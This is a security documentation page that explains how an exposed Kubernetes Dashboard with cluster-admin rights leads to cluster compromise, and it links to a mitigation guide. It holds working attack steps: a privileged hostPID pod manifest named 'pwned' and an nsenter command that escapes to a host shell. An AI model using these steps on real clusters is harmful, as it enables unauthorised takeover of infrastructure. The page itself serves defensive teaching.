---
sidebar_position: 8
title: "Exposed Kubernetes Dashboard"
description: "How an exposed and over-privileged Kubernetes Dashboard can become an entry point for full cluster compromise."
---

# Exposed Kubernetes Dashboard

The Kubernetes Dashboard is a web-based UI for managing workloads and cluster resources. While useful for development and troubleshooting, it can pose a serious security risk if exposed without proper network controls, authentication, and access restrictions.

This article explores how multiple misconfigurations can align to expose the Dashboard and allow an attacker to gain full control over the cluster.

---

## Background

In secure Kubernetes clusters, the Dashboard should not be accessible from the public internet, should require authentication, and should not be bound to a high-privilege service account. However, in misconfigured environments—especially development or test clusters—it is possible for all of these protections to be missing.

This scenario outlines a chain of misconfigurations that, when combined, lead to full cluster compromise.

---

## Common Misconfigurations

The following conditions must be present for the Dashboard to be exploitable:

- The Dashboard is accessible externally through a public IP or port.
- Authentication is disabled or bypassed.
- The Dashboard's service account is bound to a high-privilege ClusterRole, such as `cluster-admin`.
- Network-level controls (e.g., firewall rules or security groups) allow external access to the exposed port.

Any one of these in isolation may not result in a successful exploit. Together, they enable full administrative access to the cluster.

---

## Exploitation Walkthrough

### Step 1: Access the Dashboard

The attacker identifies a publicly exposed Kubernetes Dashboard through port scanning, misconfigured Ingress, or a LoadBalancer service.

For example:

```
http://<public-ip>:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

If no authentication is required, the attacker gains direct access to the UI.

### Step 2: Explore Available Actions

Once inside the Dashboard, the attacker tests for permissions such as:

- Viewing namespaces, secrets, pods, and deployments
- Creating new resources
- Executing commands inside running pods

If the Dashboard is using a service account with `cluster-admin` permissions, all of these actions are allowed.

### Step 3: Deploy a Privileged Pod

The attacker uses the Dashboard’s resource creation feature to deploy a pod with host-level access:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep infinity"]
    securityContext:
      privileged: true
  hostPID: true
  restartPolicy: Never
```

The pod runs in privileged mode with access to the host process namespace.

### Step 4: Escape to the Host System

Using the Dashboard’s Exec feature, the attacker enters the pod and executes the following command:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

If successful, the attacker escapes the container and gains a shell on the host node, effectively bypassing Kubernetes isolation.

---

## Summary

An exposed and over-privileged Kubernetes Dashboard is not a vulnerability in itself, but rather the result of multiple misconfigurations. When combined, these missteps provide an attacker with a clear path to full cluster takeover.

Although most secure production environments would not be affected by this chain, it remains a valuable example for understanding how layered security misconfigurations can be exploited. It also highlights the importance of hardening development and staging environments to the same standard as production.

For guidance on how to mitigate this risk, refer to the mitigation guide:

[Exposed Dashboard Mitigation](/docs/best_practices/cluster_setup_and_hardening/network_security/exposed_dashboard_mitigation)
